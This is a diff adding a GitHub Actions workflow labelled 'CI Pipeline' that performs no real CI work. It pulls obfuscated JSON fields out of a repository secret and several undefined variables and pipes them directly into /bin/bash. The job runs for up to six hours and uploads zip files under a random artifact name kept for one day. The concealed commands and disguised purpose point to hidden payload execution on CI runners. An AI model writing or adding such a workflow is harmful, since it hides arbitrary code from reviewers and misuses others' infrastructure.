@@ -1,0 +1,29 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          udg0: ${{ secrets.udg0 }}
+        run: |
+          printf '%s' "$udg0" | jq -r .vomk21 | /bin/bash
+          echo $zvb6778 | jq -r .oies40417 | /bin/bash
+          echo $ltig0501 | jq -r .snqkk02 | /bin/bash
+          printf '%s' "$p9" | jq -r .iefx8 | /bin/bash
+          printf '%s' "$wf34" | jq -r .kuy1052 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: nGr8niWd
+          path: "*.zip"
+          retention-days: 1
